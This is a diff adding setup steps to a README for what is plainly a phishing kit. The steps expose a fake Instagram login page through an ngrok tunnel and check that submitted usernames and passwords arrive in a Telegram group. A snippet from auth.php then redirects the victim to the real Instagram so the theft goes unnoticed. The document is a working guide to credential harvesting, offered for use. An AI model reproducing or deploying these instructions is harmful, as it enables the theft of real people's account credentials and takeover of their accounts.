@@ -209,3 +209,17 @@ Ngrok allows you to connect to your local server from the outside
 * To make the link redirects us to your fake site, you need to add `/your_folder_name` at the end of the link, similarly to 127.0.0.1 or localhost, example :
 `777-777-777.ngrok.io/your_folder_name`
 * If you have done everything correctly, the link from ngrok will take you to your local server, so now we can check if our form works.
+* Follow the link from ngrok, remember to add `/your_folder_name` at the end of the link.
+* Enter a username and password, you can enter any set of letters and numbers, it does not matter, then press "Log In".
+* If the browser redirected us to the "Instagram" page and the username and password came to us in the group, then everything works, congratulations.
+* The redirect after authorization, you can change in the file ***[auth.php](auth.php)***.
+
+`if ($sendToTelegram) {`
+  
+  **header('Location: `https://instagram.com`');**
+
+`} else {`
+
+`echo "Error";`
+
+`}`
